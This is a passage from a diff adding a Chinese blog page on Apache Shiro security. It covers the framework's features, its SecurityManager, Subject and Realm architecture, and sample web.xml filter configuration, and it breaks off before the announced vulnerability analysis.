@@ -1,0 +1,2785 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="shiro安全, Ethe&#39;s blog">
+    <meta name="description" content="这篇博客本来是打算只写一些shiro反序列化的内容的，但是发现了一篇关于shiro已知的所有cve的漏洞分析，因此就打算顺着这篇文章把shiro的漏洞都看一下，也是怕之后这个文章没了。其中的理论部分大概率和文章里的一模一样，一个是我觉得这个">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>shiro安全 | Ethe&#39;s blog</title>
+    <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/my.css">
+
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/jquery/jquery-3.6.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Ethe&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Ethe&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">shiro安全</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: scroll;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-04-25
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-05-03
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    16.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    65 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>这篇博客本来是打算只写一些shiro反序列化的内容的，但是发现了一篇关于shiro已知的所有cve的漏洞分析，因此就打算顺着这篇文章把shiro的漏洞都看一下，也是怕之后这个文章没了。其中的理论部分大概率和文章里的一模一样，一个是我觉得这个理论写的已经很足够了，另一个原因是我在这之前也没啥理论基础（</p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-5/">参考文章</a></p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a target="_blank" rel="noopener" href="https://shiro.apache.org/">Apache Shiro</a> 是一个 Java 安全框架，包括如下功能和特性：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/authentication-features.html">Authentication</a>：身份认证/登陆，验证用户是不是拥有相应的身份。在 Shiro 中，所有的操作都是基于当前正在执行的用户，这里称之为一个 <code>Subject</code>，在用户任意代码位置都可以轻易取到这个<code>Subject</code>。Shiro 支持数据源，称之为 <code>Realms</code>，可以利用其连接 LDAP\AD\JDBC 等安全数据源，并支持使用自定义的 <code>Realms</code>，并可以同时使用一个或多个 <code>Realms</code> 对一个用户进行认证，认证过程可以使用配置文件配置，无需修改代码。同时，Shiro 还支持 RememberMe，记住后下次访问就无需登录。</li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/authorization-features.html">Authorization</a>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限。同样基于 <code>Subject</code>、支持多种 <code>Realms</code>。Shiro 支持 <code>Wildcard Permissions</code> ，也就是使用通配符来对权限验证进行建模，使权限配置简单易读。Shiro 支持基于 <code>Roles</code> 和基于 <code>Permissions</code> 两种方式的验证，可以根据需要进行使用。并且支持缓存产品的使用。</li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/session-management-features.html">Session Manager</a>：会话管理，用户登陆后就是一次会话，在没有退出之前，它的所有信息都在会话中。Shiro 中的一切（包括会话和会话管理的所有方面）都是基于接口的，并使用 POJO 实现，因此可以使用任何与 JavaBeans 兼容的配置格式（如 JSON、YAML、Spring XML 或类似机制）轻松配置所有会话组件。Session 支持缓存集群的方式；还支持事件侦听器，允许在会话的生命周期内侦听生命周期事件，以执行相关逻辑。Shiro Sessions 保留发起会话的主机的 IP 地址，因此可以根据用户位置来执行不同逻辑。Shiro 对 Web 支持实现了 <code>HttpSession</code> 类及相关全部 API。也可以在 SSO 中使用。</li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/cryptography-features.html">Cryptography</a>：加密，保护数据的安全性；Shiro 专注于使用公私钥对数据进行加密，以及对密码等数据进行不可逆的哈希。</li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/permissions.html">Permissions</a>：用户权限；Shiro 将所有的操作都抽象为 Permission，并默认使用 <code>Wildcard Permissions</code> 来进行匹配。Shiro 支持实例级别的权限控制校验，例如<code>domain:action:instance</code>。</li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/caching.html">Caching</a>：缓存，为了提高 Shiro 在业务中的性能表现。Shiro 的缓存支持基本上是一个封装的 API，由用户自行选择底层的缓存方式。缓存中有三个重要的接口 <code>CacheManager</code>/<code>Cache</code>/<code>CacheManagerAware</code> ，Shiro 提供了默认的 <code>MemoryConstrainedCacheManager</code> 等实现。</li>
+</ul>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1460000037648601" alt="img"></p>
+<h1 id="Shiro概要架构"><a href="#Shiro概要架构" class="headerlink" title="Shiro概要架构"></a>Shiro概要架构</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1460000037648599" alt="img"></p>
+<p>其中：</p>
+<ol>
+<li>Subject :主体对象，负责提交用户认证和授权信息。</li>
+<li>SecurityManager：安全管理器，负责认证，授权等业务实现。</li>
+<li>Realm：领域对象，负责从数据层获取业务数据。</li>
+</ol>
+<p>接下来详细说一下这三个组件</p>
+<h2 id="SecurityManager"><a href="#SecurityManager" class="headerlink" title="SecurityManager"></a>SecurityManager</h2><p><code>org.apache.shiro.mgt.SecurityManager</code> 是 shiro 的一个核心接口，接口负责了一个 Subject 也就是“用户”的全部安全操作：</p>
+<ul>
+<li>接口本身定义了 <code>createSubject</code>、<code>login</code>、<code>logout</code> 三个方法用来创建 Subject、登陆和退出。</li>
+<li>扩展了 <code>org.apache.shiro.authc.Authenticator</code> 接口，提供了 <code>authenticate</code> 方法用来进行认证。</li>
+<li>扩展了 <code>org.apache.shiro.authz.Authorizer</code> 接口，提供了对 Permission 和 Role 的校验方法。包括 <code>has/is/check</code> 相关命名的方法。</li>
+<li>扩展了 <code>org.apache.shiro.session.mgt.SessionManager</code> 接口，提供了 <code>start</code>、<code>getSession</code> 方法用来创建可获取会话。</li>
+</ul>
+<p>Shiro 为 SecurityManager 提供了一个包含了上述所有功能的默认实现类 <code>org.apache.shiro.mgt.DefaultSecurityManager</code>，中间继承了很多中间类，并逐层实现了相关的方法，继承关系如下图。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1640939549511.png" alt="img"></p>
+<p>DefaultSecurityManager 中包含以下属性:</p>
+<ul>
+<li><code>subjectFactory</code>：默认使用 DefaultSubjectFactory，用来创建具体 Subject 实现类。</li>
+<li><code>subjectDAO</code>：默认使用 DefaultSubjectDAO，用于将 Subject 中最近信息保存到 Session 里面。</li>
+<li><code>rememberMeManager</code>：用于提供 RememberMe 相关功能。</li>
+<li><code>sessionManager</code>：默认使用 DefaultSessionManager，Session 相关操作会委托给这个类。</li>
+<li><code>authorizer</code>：默认使用 ModularRealmAuthorizer，用来配置授权策略。</li>
+<li><code>authenticator</code>：默认使用 ModularRealmAuthenticator，用来配置认证策略。</li>
+<li><code>realm</code>：对认证和授权的配置，由用户自行配置，包括 CasRealm、JdbcRealm 等。</li>
+<li><code>cacheManager</code>：缓存管理，由用户自行配置，在认证和授权时先经过，用来提升认证授权速度。</li>
+</ul>
+<p>DefaultSecurityManager 还有一个子类，就是 <code>org.apache.shiro.web.mgt.DefaultWebSecurityManager</code>，这个类在 shiro-web 包中，是 Shiro 为 HTTP/SOAP 等 http 协议连接提供的实现类，这个类默认创建配置了 <code>org.apache.shiro.web.mgt.CookieRememberMeManager</code> 用来提供 RememberMe 相关功能。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430213532419.png" alt="image-20230430213532419"></p>
+<h2 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h2><p><code>org.apache.shiro.subject.Subject</code> 是一个接口，用来表示在 Shiro 中的一个用户。因为在太多组件中都使用了 <code>User</code> 的概念，所以 Shiro 故意避开了这个关键字，使用了 <code>Subject</code>。</p>
+<p>Subject 接口同样提供了认证（login/logout）、授权（访问控制 has/is/check 方法）以及获取会话的能力。在应用程序中如果想要获取一个当前的 Subject，通常使用 <code>SecurityUtils.getSubject()</code> 方法即可。</p>
+<p>单从方法的命名和覆盖的功能来看，Subject 提供了与 SecurityManager 非常近似的方法，用来执行相关权限校验操作。而实际上，Subject 接口在 core 包中的实现类 <code>org.apache.shiro.subject.support.DelegatingSubject</code> 本质上也就是一个 SecurityManager 的代理类。</p>
+<p>DelegatingSubject 中保存了一个 transient 修饰的 SecurityManager 成员变量，在使用具体的校验方法时，实际上委托 SecurityManager 进行处理，如下图：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641263548553.png" alt="img"></p>
+<p>DelegatingSubject 中不会保存和维持一个用户的“状态（角色/权限）”，恰恰相反，每次它都依赖于底层的实现组件 SecurityManager 进行检查和校验，因此通常会要求 SecurityManager 的实现类来提供一些缓存机制。所以本质上，Subject 也是一种“无状态”的实现。</p>
+<h2 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a>Realm</h2><p>Realm 翻译过来是“领域、王国”，这里可以将其理解以为一种“有界的范围”，实际上就是权限和角色的认定。</p>
+<p><code>org.apache.shiro.realm.Realm</code> 是 Shiro 中的一个接口，Shiro 通过 Realm 来访问指定应用的安全实体——用户、角色、权限等。一个 Realm 通常与一个数据源有 1 对 1 的对应关系，如关系型数据库、文件系统或者其他类似的资源。</p>
+<p>因此，此接口的实现类，将使用特定于数据源的 API 来进行认证或授权，如 JDBC、文件IO、Hibernate/JPA 等等，官方将其解释为：特定于安全的 DAO 层。</p>
+<p>在使用中，开发人员通常不会直接实现 Realm 接口，而是实现 Shiro 提供了一些相关功能的抽象类 AuthenticatingRealm/AuthorizingRealm，或者使用针对特定数据源提供的实现类如 JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm 等等。继承关系大概如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641266951968.png" alt="img"></p>
+<p>较多情况下，开发人员会自行实现 <code>AuthorizingRealm</code> 类，并重写 <code>doGetAuthorizationInfo</code>/<code>doGetAuthenticationInfo</code> 方法来自行实现自身的认证和授权逻辑。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过对以上三个组件的了解，一次认证及授权的校验流程就形成了：</p>
+<ol>
+<li>应用程序通过获取当前访问的 Subject（也就是用户），并调用其相应校验方法；</li>
+<li>Subject 将校验委托给 SecurityManager 进行判断；</li>
+<li>SecurityManager 会调用 Realm 来获取信息来判断用户对应的角色能否进行操作。</li>
+</ol>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>这块跟开发关系有点大，感觉得单独学，所以我这里就直接ctrl cv了。</p>
+<h2 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h2><p>在普通 web 项目中， Shiro 框架的注入是通过在 <code>web.xml</code> 中配置 Filter 的方式完成的。</p>
+<p>在 Shiro 1.1 及之前的版本，通过配置 <code>IniShiroFilter</code> ，并在 <code>/WEB-INF/shiro.ini</code> 或 <code>classpath:shiro.ini</code> 中进行相应的权限配置。也可以指定配置文件路径，示例如下：</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.servlet.IniShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configPath<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>/WEB-INF/anotherFile.ini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span></code></pre>
+
+<p>在 Shiro 1.2 及之后的版本，可以进行如下配置：</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.env.EnvironmentLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span>
+
+...
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.shiro.web.servlet.ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ShiroFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span></code></pre>
+
+<p>官方更推荐直接使用 <code>ShiroFilter</code> 类进行处理，并为 Web 应用程序配置了一个 Listener： <code>EnvironmentLoaderListener</code>。这是一个 <code>ServletContextListener</code> 的子类，会在初始化时将 WebEnvironment 的实现类注入到 ServletContext 中。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641279281419.png" alt="img"></p>
+<p>ShiroFilter 则使用 WebEnvironment 中的 WebSecurityManager 来作为当前 Shiro 上下文中的 SecurityManager。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641279406501.png" alt="img"></p>
+<p>在 Filter 处理流程中，ShiroFilter 继承的 <code>doFilter</code> 调用 <code>AbstractShiroFilter#doFilterInternal</code> 方法，会使用保存的 SecurityManager 创建 Subject 对象。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641281248580.png" alt="img"></p>
+<p>并调用其 execute 方法执行后续的校验逻辑。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641280684013.png" alt="img"></p>
+<p>默认情况下，<code>EnvironmentLoaderListener</code> 创建的 WebEnvironment 的实例是 IniWebEnvironment，是基于 INI 格式的配置文件，如果不想使用这个格式，可以通过自实现一个 IniWebEnvironment 的子类，用来处理自己定义的配置文件格式，并在 <code>web.xml</code> 中进行如下配置：</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>shiroEnvironmentClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>org.su18.shiro.web.config.WebEnvironment<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span></code></pre>
+
+<p>关于 INI 配置文件的配置，在官方文档<a target="_blank" rel="noopener" href="https://shiro.apache.org/configuration.html">配置</a>一章有详细描述，主要包括 <code>[main]</code>、<code>[users]</code>、<code>[roles]</code>、<code>[urls]</code> 四项配置。如果配置了 <code>[users]</code> 或 <code>[roles]</code>，则会自动创建 <code>org.apache.shiro.realm.text.IniRealm</code> 实例，并可以在 <code>[main]</code> 配置中进行调用及配置。</p>
+<p>这里重点的配置，就在于 <code>[urls]</code> 这个配置项，详情参考相关官方配置<a target="_blank" rel="noopener" href="https://shiro.apache.org/web.html#Web-%3C!--swig%EF%BF%BC14--%3E">文档</a>。大概可以配置成如下形式：</p>
